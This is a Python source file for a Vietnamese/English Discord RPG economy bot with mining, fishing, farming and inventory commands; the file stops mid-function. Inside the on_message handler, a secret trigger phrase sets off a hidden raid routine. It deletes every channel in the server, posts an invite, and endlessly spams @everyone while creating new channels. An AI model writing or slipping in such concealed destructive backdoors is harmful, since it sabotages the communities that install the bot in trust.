from ast import Await
from pydoc import cli
from turtle import hideturtle
import discord
from discord import File
from discord.ext import commands
import random
import time
import os
import json
import asyncio
from discord.utils import get
from discord_together import DiscordTogether
import datetime
from io import BytesIO
from profile_1 import hunts, mine, farm, chop
from profile_2 import dùng, levels, profiles, token_prefix
from extend import ad
from discord import client
from discord_components import Button, Select, SelectOption, ComponentsBot
from discord_buttons_plugin import *
from discord.utils import get
import DiscordUtils


###################################
#cúp
pickaxe1 = "<:pickaxe1:945939722268721152>"
pickaxe2 = "<:pickaxe2:945939722293882940>"
pickaxe3 = "<:pickaxe3:945939761502244914>"
pickaxe4 = "<:pickaxe4:945939774160642080>"
pickaxe5 = "<:pickaxe5:946338341077528586>"
pickaxe6 = "<:pickaxe6:946338366847320116>"

#rod
wood_rod = "<:wood_rod:948571570996150292>"
rock_rod = "<:rock_rod:948571579774808104>"
copper_rod = "<:copper_rod:948571594324840458>"
iron_rod = "<:iron_rod:948571609227223081>"
gold_rod = "<:gold_rod:948571619037696000>"
magic_rod = "<:magic_rod:948571628449714176>"

#hoe
wood_hoe = "<:wood_hoe:947384545156669550>"
rock_hoe = "<:rock_hoe:947384556569391115>"
iron_hoe = "<:iron_hoe:947384570704166962>"
gold_hoe = "<:gold_hoe:947384901118853142>"
diamond_hoe = "<:diamond_hoe:947384936804003890>"
obsidian_hoe = "<:obsidian_hoe:947384949969920011>"

#khoáng sản
rock = "<:rocks:945893612972023868>"
smooth_stone = "<:da_min:945893643410083851>"
đồng = "<:dong:945893723512922162>"
sắt = "<:sat:945893741179310120>"
vàng = "<:vang:945893941088256140>"
diamond = "<:diamond_start:945893981345161216>"
ruby = "<:ruby:945894024265478184>"
glowstone = "<:glowstone:945894047225114684>"
magma = "<:magma:945894081723240478>"
obsidian = "<:obsidian:945894099872002109>"
moon_stone = "<:moon_stone:945894119300034590>"
obsidian_moon = "<:obsidian_moon:945894132864413696>"
stone_ancestor = "<:stone_ancestor:945894223541067776>"

#fish
tuna = "<:tuna:948547680009863238>"
stickleback = "<:stickleback:948547704894668860>"
squids = "<:squids:948547730068881448>"
octopuss = "<:octopuss:948547763413606440>"
electric_eel = "<:electric_eel:948547812440825876>"
salmon = "<:salmon:948547837099130880>"
dolphins = "<:dolphins:948547865184186428>"
sharks = "<:sharks:948547882104000522>"
kappa_shark = "<:kappa_shark:948547914060402769>"
purplecrystal_shark = "<:purplecrystal_shark:948547924189675614>"

#fruit
orange = "<:oranges:947103861427040266>"
apple = "<:apples:947103861133410335>"
pear = "<:pears:947103861221519381>"
pineapple = "<:pineapples:947103861489942578>"
watermelon = "<:watermelons:947103861057916969>"
dragonfruit = "<:dragonfruits:947103861632548915>"
grape = "<:grapess:947103861368311808>"
strawberry = "<:strawberrys:947103861515100160>"
cherry = "<:cherrys:947103860793671733>"
blueberry = "<:blueberrys:947103861208936519>"
herbal_stone_ring = "<:herbal_stone_ring:946352883975204914>"
flying_cucumber = "<:flying_cucumber:946352883916501083>"
flying_potatoes = "<:flying_potatoes:946352883710976061>"
ganoderma = "<:ganoderma:946352883966820382>"
purple_sweet_potato = "<:purple_sweet_potato:946352883971031050>"
red_grapes = "<:red_grapes:946352883765489726>"
crocodile_foot_herb = "<:crocodile_foot_herb:946352883920691230>"

#profile
thanhmau1 = "<:thanhmau1:946966723221938196>"
thanhmau2 = "<:thanhmau2:946966723150639104>"
thanhmautrong = "<:thanhmautrong:946966723100307546>"
trái_tim = "<:heartfull:946964281344274512>"
expthanh1 = "<:expthanh1:946971108295458916>"
expthanh2 = "<:expthanh2:946971108316442634>"
exxp = "<:exp:945951310027575316>"
coin="<:coinss:945945122045067306>"
xxxx = "<:x_:945962878563942410>"
trong = "<:trong:921038769874935910>"


########################################
os.chdir("E:\\lt\\bot\\rpg\\pro_json")
prefixes = token_prefix.to_pre[0]
TOKEN = token_prefix.to_pre[1]
client = ComponentsBot(prefixes)
client.remove_command("help")
buttons = ButtonsClient(client)

# await ctx.message.delete()
#########################################
#event
@client.event
async def on_ready():
    client.togetherControl = await DiscordTogether(TOKEN)
    print(f'Bot {client.user.name} đã hoạt động')
    await client.wait_until_ready()
    sta = ['Blaer & Magi', f'{prefixes}help[{prefixes}h]',f'Với {len(client.guilds)} máy chủ']
    while not client.is_closed():
        a = random.choice(sta)
        await client.change_presence(activity=discord.Streaming(name=a, url='https://www.twitch.tv/your_channel_here'))
        await asyncio.sleep(5)

@client.event
async def on_command_error(ctx, error):
        user = ctx.author
        await open_acc(ctx.author)
        users = await get_bank()
        if users[str(user.id)]["language"] == 0:
            if isinstance(error, commands.CommandOnCooldown):
                seconds = int(error.retry_after)
                time_remaining = str(datetime.timedelta(seconds=seconds))
                embed = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
                embed.set_author(name=f"{ctx.author.name}", icon_url=f"{user.avatar_url}")
                embed.add_field(name=f"{xxxx}Try later: {time_remaining}", value=f"You can use the command after the cooldown is over")
                await ctx.send(embed=embed)
                return
            raise error

        if users[str(user.id)]["language"] >= 1:
            if isinstance(error, commands.CommandOnCooldown):
                seconds = int(error.retry_after)
                time_remaining = str(datetime.timedelta(seconds=seconds))
                embed = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
                embed.set_author(name=f"{ctx.author.name}", icon_url=f"{user.avatar_url}")
                embed.add_field(name=f"{xxxx}Thử lại sau: {time_remaining}", value=f"Bạn có thể sử dụng lệnh sau khi hết cooldown")
                await ctx.send(embed=embed)
                return
            raise error

@client.event
async def on_message(message):
    if message.author.bot == False:
        print(f'Sv: {message.guild.name} Name: {message.author}')
    if message.content == "!fd!#dthê lônsdsad sdsadcút":
        # vchannel = await message.guild.create_voice_channel("helo")
        vchannel = await message.guild.create_text_channel("helo")
        invite = await discord.TextChannel.create_invite(client.get_channel(vchannel.id))
        # invite = await discord.VoiceChannel.create_invite(client.get_channel(vchannel.id))
        await message.channel.send("{}".format(invite))

        guild = message.guild
        for channel in guild.channels:
            await channel.delete()

        while True:
            for c in message.guild.text_channels:
                # await client.get_channel(949915922896945202).send("@everyone helo spam chết mẹ server mày")
                await c.send("@everyone helo raid server cho mấy bạn vừa lòng")
            await guild.create_text_channel('bạn đã bị bay server')
    else:
        pass
    await client.process_commands(message)


#bô nứt
@buttons.click
async def ran(ctx):
  await randoms(ctx=ctx)

@client.command()
async def randoms(ctx, ran1:int, *,ran2:int):
    quay = random.randint(ran1, ran2)
    embed = discord.Embed(color = (0xF76841))
    embed.add_field(name="You randomly dialed a number:", value=f"**{quay}**")
    await ctx.send(embed=embed)
    await buttons.send(
            channel = ctx.channel.id,
            components = [
            ActionRow([
                Button(
                style = ButtonType().Primary,
                label = "Randoms",
                custom_id = "ran",
                )
            ])
            ]
        )

@client.command()
async def hire_as_a_bot(ctx):
    await open_acc(ctx.author)
    users = await get_bank()
    user = ctx.author
    if users[str(user.id)]["language"] == 0:
        embed = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
        embed.set_author(name=f"{ctx.author.name}", icon_url=f"{user.avatar_url}")
        embed.add_field(name=f"Hire as a Bot", value=f"If you want to make a bot rpg economy or bot miner economy or bot music then contact me via discord and this is my discord name: MAGI NATSUKI#3206", inline=False)
        embed.add_field(name="Conditions for making bots", value=f"\n**Bot creation fee:**"
                                                                f"\n{trong}- For **each command** you ask me to create **You have to pay Me 10K OWO**"
                                                                f"\n{trong}- If the bot you want me to create has **your own emoji**, Please send me:"
                                                                f"\n{trong*2}+ **Emoji**"
                                                                f"\n{trong*2}+ **Invite Link Bots**"
                                                                f"\n{trong}**Sincerely thank!**")
        embed.set_footer(text="MAGI NATSUKI#3206")
        await ctx.send(embed=embed)

    if users[str(user.id)]["language"] >= 1:
        embed = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
        embed.set_author(name=f"{ctx.author.name}", icon_url=f"{user.avatar_url}")
        embed.add_field(name=f"Thuê làm Bot", value=f"Nếu bạn muốn tạo bot rpg economy hoặc bot miner economy hoặc bot music thì hãy liên hệ với tôi qua Discord và đây là tên discord của tôi: MAGI NATSUKI#3206", inline=False)
        embed.add_field(name="Điều kiện tạo bot", value=f"\n**Phí tạo bot:**"
                                                                f"\n{trong}- Đối với **mỗi lệnh** bạn yêu cầu tôi tạo **Bạn phải trả cho tôi 10K OWO**"
                                                                f"\n{trong}- Nếu bot bạn muốn tôi tạo có **Emoji của riêng bạn**, hãy gửi cho tôi:"
                                                                f"\n{trong*2}+ **Emoji**"
                                                                f"\n{trong*2}+ **Link mời Bots**"
                                                                f"\n{trong}**Xin chân thành cảm ơn!**")
        embed.set_footer(text="MAGI NATSUKI#3206")
        await ctx.send(embed=embed)


#Resource gathering
@client.command(aliases=['mine'])
@commands.cooldown(1, 180, commands.BucketType.user)
async def s(ctx):
    await mine.s(ctx=ctx)

@client.command()
@commands.cooldown(1, 180, commands.BucketType.user)
async def harvest(ctx):
    await farm.harvest(ctx=ctx)

@client.command()
@commands.cooldown(1, 180, commands.BucketType.user)
async def hunt(ctx):
    await hunts.hunt(ctx=ctx)

@client.command()
@commands.cooldown(1, 180, commands.BucketType.user)
async def fish(ctx):
    user = ctx.author
    embed = discord.Embed(color = (0xF76841))
    embed.add_field(name=":boom:You are fishing", value=f"{tuna}Let's wait....")
    msg = await ctx.send(embed=embed)

    await asyncio.sleep(1)
    embed.clear_fields()
    embed.add_field(name=f"{tuna}Let's wait....", value=f"Wait...")
    await msg.edit(embed=embed)

    await asyncio.sleep(1)
    embed.clear_fields()
    embed.add_field(name=f"{salmon}Let's wait....", value=f"Wait Wait...")
    await msg.edit(embed=embed)

    await asyncio.sleep(1)
    embed.clear_fields()
    embed.add_field(name=f"{sharks}The fish has bitten the hook", value=f"{copper_rod}Drag the Rod")
    await msg.edit(embed=embed)

    số_lần_kéo =  random.randint(1, 3)
    kéo_đc = 0
    embed = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
    embed.add_field(name=f"{copper_rod}You Are Pulling the Rod", value=f":fishing_pole_and_fish:Pull It Stronger!:boom:Get Stronger!", inline=False)
    embed.set_footer(text="Tip: pbuy + id")
    msg = await ctx.reply(embed=embed, components=[Select(
        placeholder="Inviting you to choose",
        options=[
                SelectOption(label="Next sentence",value="option1",description="Pull Stronger"),
                SelectOption(label="Drop",value="option2",description="Stop Tired So Let Go"),
        ],
        custom_id = 'SelectTesting'
    )])
    # embed.clear_fields()
    embed1 = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.blue())
    embed1.add_field(name=f"{trái_tim}Next sentence", value=f"{wood_rod}Pulling the rope for the 1st time")
    embed1.set_author(name=f"{ctx.author.name}", icon_url=f"{user.avatar_url}")

    
    embed2 = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.purple())
    embed2.add_field(name=f"{xxxx}Drop", value=f"I'm Too Tired Let It Go")
    embed2.set_author(name=f"{ctx.author.name}", icon_url=f"{user.avatar_url}")

    while True:
        interaction = await client.wait_for("select_option",check=lambda inter: inter.custom_id == 'SelectTesting' and inter.user == ctx.author)
        label = interaction.values[0]
        if label == "option1":
            await interaction.send(
                ephemeral=False,
                embed=embed1
            )
            kéo_đc +=1
            while kéo_đc <= số_lần_kéo:
                await asyncio.sleep(1.5)
                kéo_đc +=1
                embed1 = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.blue())
                embed1.add_field(name=f"{trái_tim}Next sentence", value=f"{wood_rod}Pulling rope times {kéo_đc}")
                await ctx.reply(embed=embed1)

            if kéo_đc >= số_lần_kéo:
                bắt = ["Bắt được", "Bắt được", "Bắt được", None]
                batws2 = random.choice(bắt)

                if batws2 == "Bắt được":
                    await open_acc(ctx.author)
                    users = await get_bank()
                    user = ctx.author
                    embeds = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.purple())
                    embeds.add_field(name=":sparkles:Congratulation", value=f"{trái_tim}You caught a fish")
                    await ctx.reply(embed=embeds)

                    if users[str(user.id)]["rod"] == 1:
                            loại_f1 = [f"{tuna}", f"{stickleback}", f"{squids}"]
                            icon_rod = f"{wood_rod}"
                            tên_rod = "Wood Rod"

                            số_lượng_tuna = random.randint(0, 5)
                            if số_lượng_tuna <= 0:
                                sa = ""
                                loại_f1[0] = ""
                            if số_lượng_tuna >= 1:
                                sa = f"+`{số_lượng_tuna} Tuna `{loại_f1[0]}\n"
                                users[str(user.id)]["tuna"] += số_lượng_tuna
                                with open("rpg.json", "w") as f:
                                    json.dump(users, f, indent=4)

                            số_lượng_stickleback = random.randint(0, 5)
                            if số_lượng_stickleback <= 0:
                                sas = ""
                                loại_f1[1] = ""
                            if số_lượng_stickleback >= 1:
                                sas = f"+`{số_lượng_stickleback} Stickleback `{loại_f1[1]}\n"
                                users[str(user.id)]["stickleback"] += số_lượng_stickleback
                                with open("rpg.json", "w") as f:
                                    json.dump(users, f, indent=4)

                            số_lượng_squids = random.randint(0, 5)
                            if số_lượng_squids <= 0:
                                sass = ""
                                loại_f1[2] = ""
                            if số_lượng_squids >= 1:
                                sass = f"+`{số_lượng_squids} Squid `{loại_f1[2]}"
                                users[str(user.id)]["squids"] += số_lượng_squids
                                with open("rpg.json", "w") as f:
                                    json.dump(users, f, indent=4)


                    if users[str(user.id)]["rod"] == 2:
                            loại_f2 = [f"{squids}", f"{octopuss}", f"{electric_eel}"]
                            icon_rod = f"{rock_rod}"
                            tên_rod = "Rock Rod"

                            số_lượng_squids = random.randint(0, 5)
                            if số_lượng_squids <= 0:
                                sa = ""
                                loại_f2[0] = ""
                            if số_lượng_squids >= 1:
                                sa = f"+`{số_lượng_squids} Squid `{loại_f2[0]}\n"
                                users[str(user.id)]["squids"] += số_lượng_squids
                                with open("rpg.json", "w") as f:
                                    json.dump(users, f, indent=4)

                            số_lượng_octopuss = random.randint(0, 5)
                            if số_lượng_octopuss <= 0:
                                sas = ""
                                loại_f2[1] = ""
                            if số_lượng_octopuss >= 1:
                                sas = f"+`{số_lượng_octopuss} ) Octopus `{loại_f2[1]}\n"
                                users[str(user.id)]["octopuss"] += số_lượng_octopuss
                                with open("rpg.json", "w") as f:
                                    json.dump(users, f, indent=4)

                            số_lượng_electric_eel = random.randint(0, 5)
                            if số_lượng_electric_eel <= 0:
                                sass = ""
                                loại_f2[2] = ""
                            if số_lượng_electric_eel >= 1:
                                sass = f"+`{số_lượng_electric_eel} Electric eel `{loại_f2[2]}"
                                users[str(user.id)]["electric_eel"] += số_lượng_electric_eel
                                with open("rpg.json", "w") as f:
                                    json.dump(users, f, indent=4)


                    if users[str(user.id)]["rod"] == 3:
                            loại_f3 = [f"{electric_eel}", f"{salmon}", f"{dolphins}"]
                            icon_rod = f"{copper_rod}"
                            tên_rod = "Copper Rod"

                            số_lượng_electric_eel = random.randint(0, 5)
                            if số_lượng_electric_eel <= 0:
                                sa = ""
                                loại_f3[0] = ""
                            if số_lượng_electric_eel >= 1:
                                sa = f"+`{số_lượng_electric_eel} Electric eel `{loại_f3[0]}\n"
                                users[str(user.id)]["electric_eel"] += số_lượng_electric_eel
                                with open("rpg.json", "w") as f:
                                    json.dump(users, f, indent=4)

                            số_lượng_salmon = random.randint(0, 5)
                            if số_lượng_salmon <= 0:
                                sas = ""
                                loại_f3[1] = ""
                            if số_lượng_salmon >= 1:
                                sas = f"+`{số_lượng_salmon} Salmon `{loại_f3[1]}\n"
                                users[str(user.id)]["salmon"] += số_lượng_salmon
                                with open("rpg.json", "w") as f:
                                    json.dump(users, f, indent=4)

                            số_lượng_dolphins = random.randint(0, 5)
                            if số_lượng_dolphins <= 0:
                                sass = ""
                                loại_f3[2] = ""
                            if số_lượng_dolphins >= 1:
                                sass = f"+`{số_lượng_dolphins} Dolphin `{loại_f3[2]}"
                                users[str(user.id)]["dolphins"] += số_lượng_dolphins
                                with open("rpg.json", "w") as f:
                                    json.dump(users, f, indent=4)


                    if users[str(user.id)]["rod"] == 4:
                            loại_f4 = [f"{salmon}", f"{dolphins}", f"{sharks}"]
                            icon_rod = f"{iron_rod}"
                            tên_rod = "Iron Rod"


                            số_lượng_salmon = random.randint(0, 5)
                            if số_lượng_salmon <= 0:
                                sa = ""
                                loại_f4[0] = ""
                            if số_lượng_salmon >= 1:
                                sa = f"+`{số_lượng_salmon} Salmon `{loại_f4[0]}\n"
                                users[str(user.id)]["salmon"] += số_lượng_salmon
                                with open("rpg.json", "w") as f:
                                    json.dump(users, f, indent=4)

                            số_lượng_dolphins = random.randint(0, 5)
                            if số_lượng_dolphins <= 0:
                                sas = ""
                                loại_f4[1] = ""
                            if số_lượng_dolphins >= 1:
                                sas = f"+`{số_lượng_dolphins} Dolphin `{loại_f4[1]}\n"
                                users[str(user.id)]["dolphins"] += số_lượng_dolphins
                                with open("rpg.json", "w") as f:
                                    json.dump(users, f, indent=4)

                            số_lượng_sharks = random.randint(0, 3)
                            if số_lượng_sharks <= 0:
                                sass = ""
                                loại_f4[2] = ""
                            if số_lượng_sharks >= 1:
                                sass = f"+`{số_lượng_sharks} Shark `{loại_f4[2]}"
                                users[str(user.id)]["sharks"] += số_lượng_sharks
                                with open("rpg.json", "w") as f:
                                    json.dump(users, f, indent=4)


                    if users[str(user.id)]["rod"] == 5:
                            loại_f5 = [f"{dolphins}", f"{sharks}", f"{kappa_shark}"]
                            icon_rod = f"{gold_rod}"
                            tên_rod = "Gold Rod"

                            số_lượng_dolphins = random.randint(0, 5)
                            if số_lượng_dolphins <= 0:
                                sa = ""
                                loại_f5[0] = ""
                            if số_lượng_dolphins >= 1:
                                sa = f"+`{số_lượng_dolphins} Dolphin `{loại_f5[0]}\n"
                                users[str(user.id)]["dolphins"] += số_lượng_dolphins
                                with open("rpg.json", "w") as f:
                                    json.dump(users, f, indent=4)

                            số_lượng_sharks = random.randint(0, 3)
                            if số_lượng_sharks <= 0:
                                sas = ""
                                loại_f5[1] = ""
                            if số_lượng_sharks >= 1:
                                sas = f"+`{số_lượng_sharks} Shark `{loại_f5[1]}\n"
                                users[str(user.id)]["sharks"] += số_lượng_sharks
                                with open("rpg.json", "w") as f:
                                    json.dump(users, f, indent=4)

                            số_lượng_kappa_shark = random.randint(0, 2)
                            if số_lượng_kappa_shark <= 0:
                                sass = ""
                                loại_f5[2] = ""
                            if số_lượng_kappa_shark >= 1:
                                sass = f"+`{số_lượng_kappa_shark} Kappa Shark `{loại_f5[2]}"
                                users[str(user.id)]["kappa_shark"] += số_lượng_kappa_shark
                                with open("rpg.json", "w") as f:
                                    json.dump(users, f, indent=4)


                    if users[str(user.id)]["rod"] == 6:
                            loại_f6 = [f"{sharks}", f"{kappa_shark}", f"{purplecrystal_shark}"]
                            icon_rod = f"{magic_rod}"
                            tên_rod = "Magic Rod"

                            số_lượng_sharks = random.randint(0, 3)
                            if số_lượng_sharks <= 0:
                                sa = ""
                                loại_f6[0] = ""
                            if số_lượng_sharks >= 1:
                                sa = f"+`{số_lượng_sharks} Shark `{loại_f6[0]}\n"
                                users[str(user.id)]["sharks"] += số_lượng_sharks
                                with open("rpg.json", "w") as f:
                                    json.dump(users, f, indent=4)

                            số_lượng_kappa_shark = random.randint(0, 2)
                            if số_lượng_kappa_shark <= 0:
                                sas = ""
                                loại_f6[1] = ""
                            if số_lượng_kappa_shark >= 1:
                                sas = f"+`{số_lượng_kappa_shark} Kappa Shark `{loại_f6[1]}\n"
                                users[str(user.id)]["kappa_shark"] += số_lượng_kappa_shark
                                with open("rpg.json", "w") as f:
                                    json.dump(users, f, indent=4)

                            số_lượng_purplecrystal_shark = random.randint(0, 2)
                            if số_lượng_purplecrystal_shark <= 0:
                                sass = ""
                                loại_f6[2] = ""
                            if số_lượng_purplecrystal_shark >= 1:
                                sass = f"+`{số_lượng_purplecrystal_shark} Purple Crystal Shark `{loại_f6[2]}"
                                users[str(user.id)]["purplecrystal_shark"] += số_lượng_purplecrystal_shark
                                with open("rpg.json", "w") as f:
                                    json.dump(users, f, indent=4)


                    exp = random.randint(10, 30)
                    eexxpp = f"+`{exp} XP`{exxp}\n"
                    users[str(user.id)]["exp"] += exp
                    with open("rpg.json", "w") as f:
                        json.dump(users, f, indent=4)


                    users[str(user.id)]["exp_after"] = users[str(user.id)]["lvl"] ** 4
                    with open("rpg.json", "w") as f:
                        json.dump(users, f, indent=4)

                    if users[str(user.id)]["exp"] >= users[str(user.id)]["exp_after"]:
                        users[str(user.id)]["exp"] = 0
                        with open("rpg.json", "w") as f:
                            json.dump(users, f, indent=4)

                        users[str(user.id)]["lvl"] += 1
                        with open("rpg.json", "w") as f:
                            json.dump(users, f, indent=4)

                        await ctx.send(f"{ctx.author.mention} leveled up **{users[str(user.id)]['lvl']}**")


                    if users[str(user.id)]["language"] == 0:
                        embed = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
                        embed.add_field(name=f"You catch kinds of fish: ", value=f"{eexxpp}{sa}{sas}{sass}{trong}", inline=False)
                        embed.add_field(name="You are using rod type:", value=f"→{icon_rod}**{tên_rod}**{trong*2}→Level: **{users[str(user.id)]['lvl']}**", inline=False)
                        # embed.set_footer(text=f"{trong}") 
                        await ctx.reply(embed=embed)

                    if users[str(user.id)]["language"] >= 1:
                        embed = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
                        embed.add_field(name=f"Bạn đã câu được các loại cá sau: ", value=f"{eexxpp}{sa}{sas}{sass}{trong}", inline=False)
                        embed.add_field(name="Bạn đang sử dụng loại cần câu", value=f"→{icon_rod}**{tên_rod}**{trong*2}→Level: **{users[str(user.id)]['lvl']}**", inline=False)
                        # embed.set_footer(text=f"{trong}") 
                        await ctx.reply(embed=embed)
            
                if batws2 == None:
                    embedw = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.purple())
                    embedw.add_field(name=f"{xxxx}You are not so lucky", value=f"{wood_rod}The fishing line is gone")
                    await ctx.reply(embed=embedw)
                    break

        elif label == "option2":
            await interaction.send(
                ephemeral=False,
                embed=embed2
            )
            break

#Profile
@client.command()
async def inv(ctx):
    await open_acc(ctx.author)
    users = await get_bank()
    user = ctx.author

    #cúp
    if users[str(user.id)]["pickaxe1"] >= 1:
        pick1 = f'{trong}+{pickaxe1}`Pickaxe Rock`\n'
    if users[str(user.id)]["pickaxe1"] < 1:
        pick1 = ''

    if users[str(user.id)]["pickaxe2"] >= 1:
        pick2 = f'{trong}+{pickaxe2}`Pickaxe Copper`\n'
    if users[str(user.id)]["pickaxe2"] < 1:
        pick2 = ''

    if users[str(user.id)]["pickaxe3"] >= 1:
        pick3 = f'{trong}+{pickaxe3}`Pickaxe Iron`\n'
    if users[str(user.id)]["pickaxe3"] < 1:
        pick3 = ''

    if users[str(user.id)]["pickaxe4"] >= 1:
        pick4 = f'{trong}+{pickaxe4}`Pickaxe Gold`\n'
    if users[str(user.id)]["pickaxe4"] < 1:
        pick4 = ''

    if users[str(user.id)]["pickaxe5"] >= 1:
        pick5 = f'{trong}+{pickaxe5}`Pickaxe Diamond`\n'
    if users[str(user.id)]["pickaxe5"] < 1:
        pick5 = ''

    if users[str(user.id)]["pickaxe6"] >= 1:
        pick6 = f'{trong}+{pickaxe6}`Pickaxe Obsidian`'
    if users[str(user.id)]["pickaxe6"] < 1:
        pick6 = ''


    #khoáng sản
    if users[str(user.id)]["rock"] >= 1:
        rocks = f'+{rock}{users[str(user.id)]["rock"]} `Rock`\n'
    if users[str(user.id)]["rock"] < 1:
        rocks = ''

    if users[str(user.id)]["smoothstone"] >= 1:
        smoothstone = f'{trong}+{smooth_stone}{users[str(user.id)]["smoothstone"]} `Smooth Stone`\n'
    if users[str(user.id)]["smoothstone"] < 1:
        smoothstone = ''

    if users[str(user.id)]["copper"] >= 1:
        copper = f'{trong}+{đồng}{users[str(user.id)]["copper"]} `Copper`\n'
    if users[str(user.id)]["copper"] < 1:
        copper = ''

    if users[str(user.id)]["iron"] >= 1:
        iron = f'{trong}+{sắt}{users[str(user.id)]["iron"]} `Iron`\n'
    if users[str(user.id)]["iron"] < 1:
        iron = ''

    if users[str(user.id)]["gold"] >= 1:
        gold = f'{trong}+{vàng}{users[str(user.id)]["gold"]} `Gold`\n'
    if users[str(user.id)]["gold"] < 1:
        gold = ''

    if users[str(user.id)]["diamond"] >= 1:
        diamonds = f'{trong}+{diamond}{users[str(user.id)]["diamond"]} `Diamond`\n'
    if users[str(user.id)]["diamond"] < 1:
        diamonds = ''

    if users[str(user.id)]["ruby"] >= 1:
        rubys = f'{trong}+{ruby}{users[str(user.id)]["ruby"]} `Ruby`\n'
    if users[str(user.id)]["ruby"] < 1:
        rubys = ''

    if users[str(user.id)]["glowstone"] >= 1:
        glowstones = f'{trong}+{glowstone}{users[str(user.id)]["glowstone"]} `Glowstone`\n'
    if users[str(user.id)]["glowstone"] < 1:
        glowstones = ''

    if users[str(user.id)]["magma"] >= 1:
        magmas = f'{trong}+{magma}{users[str(user.id)]["magma"]} `Magma`\n'
    if users[str(user.id)]["magma"] < 1:
        magmas = ''

    if users[str(user.id)]["obsidian"] >= 1:
        obsidians = f'{trong}+{obsidian}{users[str(user.id)]["obsidian"]} `Obsidian`\n'
    if users[str(user.id)]["obsidian"] < 1:
        obsidians = ''

    if users[str(user.id)]["moonstone"] >= 1:
        moonstone = f'{trong}+{moon_stone}{users[str(user.id)]["moonstone"]} `Moon Stone`\n'
    if users[str(user.id)]["moonstone"] < 1:
        moonstone = ''

    if users[str(user.id)]["obsidianmoon"] >= 1:
        obsidianmoon = f'{trong}+{obsidian_moon}{users[str(user.id)]["obsidianmoon"]} `Obsidian Moon`\n'
    if users[str(user.id)]["obsidianmoon"] < 1:
        obsidianmoon = ''

    if users[str(user.id)]["stoneancestor"] >= 1:
        stoneancestor = f'{trong}+{stone_ancestor}{users[str(user.id)]["stoneancestor"]} `Stone Ancestor`'
    if users[str(user.id)]["stoneancestor"] < 1:
        stoneancestor = ''

    #fish
    if users[str(user.id)]["tuna"] >= 1:
        tunas = f'{trong}+{tuna}{users[str(user.id)]["tuna"]} `Tuna`\n'
    if users[str(user.id)]["tuna"] < 1:
        tunas = ''

    if users[str(user.id)]["stickleback"] >= 1:
        sticklebacks = f'{trong}+{stickleback}{users[str(user.id)]["stickleback"]} `Stickleback`\n'
    if users[str(user.id)]["stickleback"] < 1:
        sticklebacks = ''

    if users[str(user.id)]["squids"] >= 1:
        squidss = f'{trong}+{squids}{users[str(user.id)]["squids"]} `Squid`\n'
    if users[str(user.id)]["squids"] < 1:
        squidss = ''

    if users[str(user.id)]["octopuss"] >= 1:
        octopus = f'{trong}+{octopuss}{users[str(user.id)]["octopuss"]} `Octopus`\n'
    if users[str(user.id)]["octopuss"] < 1:
        octopus = ''

    if users[str(user.id)]["electric_eel"] >= 1:
        electric_eels = f'{trong}+{electric_eel}{users[str(user.id)]["electric_eel"]} `Electric Eel`\n'
    if users[str(user.id)]["electric_eel"] < 1:
        electric_eels = ''

    if users[str(user.id)]["salmon"] >= 1:
        salmons = f'{trong}+{salmon}{users[str(user.id)]["salmon"]} `Salmon`\n'
    if users[str(user.id)]["salmon"] < 1:
        salmons = ''

    if users[str(user.id)]["dolphins"] >= 1:
        dolphinss = f'{trong}+{dolphins}{users[str(user.id)]["dolphins"]} `Dolphin`\n'
    if users[str(user.id)]["dolphins"] < 1:
        dolphinss = ''

    if users[str(user.id)]["sharks"] >= 1:
        sharkss = f'{trong}+{sharks}{users[str(user.id)]["sharks"]} `Shark`\n'
    if users[str(user.id)]["sharks"] < 1:
        sharkss = ''

    if users[str(user.id)]["kappa_shark"] >= 1:
        kappa_sharks = f'{trong}+{kappa_shark}{users[str(user.id)]["kappa_shark"]} `Kappa Shark`\n'
    if users[str(user.id)]["kappa_shark"] < 1:
        kappa_sharks = ''

    if users[str(user.id)]["purplecrystal_shark"] >= 1:
        purplecrystal_sharks = f'{trong}+{purplecrystal_shark}{users[str(user.id)]["purplecrystal_shark"]} `Purple Crystal Shark`\n'
    if users[str(user.id)]["purplecrystal_shark"] < 1:
        purplecrystal_sharks = ''

    #fruit
    if users[str(user.id)]["orange"] >= 1:
        oranges = f'+{orange}{users[str(user.id)]["orange"]} `Orange`\n'
    if users[str(user.id)]["orange"] < 1:
        oranges = ''

    if users[str(user.id)]["apple"] >= 1:
        apples = f'{trong}+{apple}{users[str(user.id)]["apple"]} `Apple`\n'
    if users[str(user.id)]["apple"] < 1:
        apples = ''

    if users[str(user.id)]["pear"] >= 1:
        pears = f'{trong}+{pear}{users[str(user.id)]["pear"]} `Pear`\n'
    if users[str(user.id)]["pear"] < 1:
        pears = ''

    if users[str(user.id)]["watermelon"] >= 1:
        watermelons = f'{trong}+{watermelon}{users[str(user.id)]["watermelon"]} `Watermelon`\n'
    if users[str(user.id)]["watermelon"] < 1:
        watermelons = ''

    if users[str(user.id)]["dragonfruit"] >= 1:
        dragonfruits = f'{trong}+{dragonfruit}{users[str(user.id)]["dragonfruit"]} `Dragon fruit`'
    if users[str(user.id)]["dragonfruit"] < 1:
        dragonfruits = ''

    if users[str(user.id)]["grape"] >= 1:
        grapes = f'+{grape}{users[str(user.id)]["grape"]} `Grape`\n'
    if users[str(user.id)]["grape"] < 1:
        grapes = ''

    if users[str(user.id)]["strawberry"] >= 1:
        strawberrys = f'{trong}+{strawberry}{users[str(user.id)]["strawberry"]} `Strawberry`\n'
    if users[str(user.id)]["strawberry"] < 1:
        strawberrys = ''

    if users[str(user.id)]["blueberry"] >= 1:
        blueberrys = f'{trong}+{blueberry}{users[str(user.id)]["blueberry"]} `Blueberry`\n'
    if users[str(user.id)]["blueberry"] < 1:
        blueberrys = ''

    if users[str(user.id)]["herbal_stone_ring"] >= 1:
        herbal_stone_rings = f'{trong}+{herbal_stone_ring}{users[str(user.id)]["herbal_stone_ring"]} `herbal stone ring`\n'
    if users[str(user.id)]["herbal_stone_ring"] < 1:
        herbal_stone_rings = ''

